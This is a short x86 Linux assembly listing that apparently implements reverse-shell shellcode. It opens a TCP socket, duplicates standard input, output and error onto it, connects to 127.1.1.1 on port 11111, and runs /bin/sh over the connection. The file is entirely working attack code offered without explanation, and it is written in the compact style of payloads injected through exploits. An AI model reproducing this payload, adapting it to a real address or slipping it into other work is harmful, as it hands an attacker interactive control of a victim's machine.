.global main
main:
xor    %ebx,%ebx
mul    %ebx
push $0x66
pop %eax
#mov    $0x66,%al
inc    %ebx
push   %edx
push   %ebx
push   $0x2
mov    %esp,%ecx
int    $0x80
pop    %ecx
xchg   %eax,%ebx
label:
mov    $0x3f,%al
int    $0x80
dec    %ecx
jns    label
mov    $0x66,%al
push   $0x101017f
pushw  $0x672b
pushw  $0x2
mov    %esp,%ecx
push   $0x10
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80
mov    $0xb,%al
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
xor    %ecx,%ecx
int    $0x80

